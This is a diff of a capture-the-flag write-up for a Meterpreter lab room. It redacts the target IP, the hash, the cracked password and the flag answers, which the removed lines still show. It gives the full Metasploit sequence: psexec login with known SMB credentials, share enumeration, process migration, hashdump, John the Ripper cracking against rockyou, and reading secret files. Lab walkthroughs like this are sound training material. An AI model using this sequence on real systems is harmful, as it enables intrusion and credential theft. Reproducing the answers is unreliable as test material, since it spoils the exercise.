@@ -81,17 +81,13 @@ Others Commands (these will be listed under different menu categories in the hel
 
 | Title | IP Address |
 | :----: | :----: |
-| Win4Meterpreter | 10.10.107.174 |
+| Win4Meterpreter | `1*.**.***.***` |
 
 Using `msfconsole`:
 
 ```bash
-db_nmap -A -vv -T4 -oN initial.nmap 10.10.107.174
-```
-
-Result: [initial.nmap](initial.nmap)
-
-```bash
+msfconsole
+db_nmap -A -vv -T4 -oN initial 1*.**.***.***
 user exploit/windows/smb/psexec
 hosts -R
 set lhost <localhost>
@@ -100,21 +96,21 @@ set smbpass Password1
 run
 ```
 
-meterpreter:
+RHOST:
 
 ```bash
 sysinfo
 ```
 
-> `Computer : ACME-TEST`
+> `Computer : A***-T***`
 
-> `Domain : FLASH`
+> `Domain : F****`
 
 ```bash
 background
 ```
 
-`msfconsole`:
+LHOST:
 
 ```bash
 use post/windows/gather/enum_shares
@@ -122,13 +118,13 @@ set session 1
 run
 ```
 
-> `[*] Name: speedster`
+> `[*] Name: s********`
 
 ```bash
 sessions 1
 ```
 
-meterpreter:
+RHOST:
 
 ```bash
 ps
@@ -141,54 +137,54 @@ migrate 756
 hashdump
 ```
 
-> `jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::`
+> `jchambers:1114:aad3b435b51404eeaad3b435b51404ee:6*******************************:::`
 
-Copy
+- Copy
 
 ```bash
 background
 ```
 
-`msfconsole`:
+LHOST:
 
 ```bash
 cat > hash
 ```
 
-Paste
+- Paste
 
 ```bash
 john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
 ```
 
-> `Trustno1 (?)`
+> `T******* (?)`
 
 ```bash
 sessions 1
 ```
 
-meterpreter:
+RHOST:
 
 ```bash
 search -f secrets.txt
 ```
 
-> `c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt (35 bytes)`
+> `C:\P****** F**** (***)\W****** M********* P*******\secrets.txt (35 bytes)`
 
 ```bash
-cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
+cat "C:\P****** F**** (***)\W****** M********* P*******\secrets.txt"
 ```
 
-> `My Twitter password is KDSvbsw3849!`
+> `My Twitter password is KDS********!`
 
 ```bash
 search -f realsecret.txt
 ```
 
-> `c:\inetpub\wwwroot\realsecret.txt (34 bytes)`
+> `C:\*******\*******\realsecret.txt (34 bytes)`
 
 ```bash
-cat "c:\inetpub\wwwroot\realsecret.txt"
+cat "C:\*******\*******\realsecret.txt"
 ```
 
-> `The Flash is the fastest man alive`
+> `T** F**** i* t** f****** m** a****`
